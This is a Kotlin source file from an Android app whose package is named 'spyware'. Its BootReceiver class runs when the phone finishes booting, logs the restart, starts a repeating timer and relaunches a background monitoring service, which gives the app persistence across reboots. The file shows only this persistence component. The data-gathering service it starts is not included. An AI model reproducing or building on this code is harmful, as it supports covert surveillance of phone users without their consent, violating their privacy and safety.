package com.example.spyware

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.example.spyware.common.Constants
import log
import org.json.JSONObject

class BootReceiver : BroadcastReceiver() {
    private lateinit var alarmManger:AlarmManger

    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
            log(context,JSONObject().put("message","Phone restarted"))
            val serviceIntent = Intent(context, MainService::class.java)
            alarmManger= AlarmManger(context)
            alarmManger.start(Constants.timerSeconds*1000)

            // If starting a foreground service
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }

            // If starting an activity instead of a service:
            /*
            serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(serviceIntent)
            */
        }
    }
}
